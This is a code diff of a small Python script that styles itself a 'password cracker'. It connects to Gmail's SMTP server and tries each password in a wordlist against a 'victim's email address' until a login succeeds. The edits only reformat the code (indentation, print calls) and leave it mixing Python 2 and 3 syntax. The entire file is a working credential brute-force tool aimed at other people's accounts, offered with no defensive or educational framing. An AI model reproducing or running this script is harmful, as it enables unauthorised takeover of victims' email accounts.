@@ -15,18 +15,18 @@
 import smtplib
 
 class bcolors:
-    OK = '\033[92m'
-    FAIL = '\033[91m'
-    BOLD = '\033[1m'
-    ENDC = '\033[0m'
-    UNDERLINE = '\033[4m'
+	OK = '\033[92m'
+	FAIL = '\033[91m'
+	BOLD = '\033[1m'
+	ENDC = '\033[0m'
+	UNDERLINE = '\033[4m'
 
 smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
 smtpserver.ehlo()
 smtpserver.starttls()
 
-print bcolors.BOLD + "Welcome to password cracker - by HardStiff" + bcolors.ENDC
-print bcolors.BOLD + "TRYING WITH PASSWORDS IN: psw.list" + bcolors.ENDC
+print(bcolors.BOLD + "Welcome to password cracker - by HardStiff" + bcolors.ENDC)
+print(bcolors.BOLD + "TRYING WITH PASSWORDS IN: psw.list" + bcolors.ENDC)
 
 user = raw_input("Enter the victim's email address: ")
 passwfile = "psw.txt"
@@ -35,7 +35,7 @@ passwfile = open(passwfile, "r")
 for password in passwfile:
 	try:
 		smtpserver.login(user, password)
-		print bcolors.UNDERLINE + "Password Found: %s"  % password + bcolors.ENDC
-		break;
+		print(bcolors.UNDERLINE + "Password Found: %s" % password + bcolors.ENDC)
+		break
 	except smtplib.SMTPAuthenticationError:
-		print bcolors.FAIL + "Password Incorrect: %s" % password + bcolors.ENDC
+		print(bcolors.FAIL + "Password Incorrect: %s" % password + bcolors.ENDC)
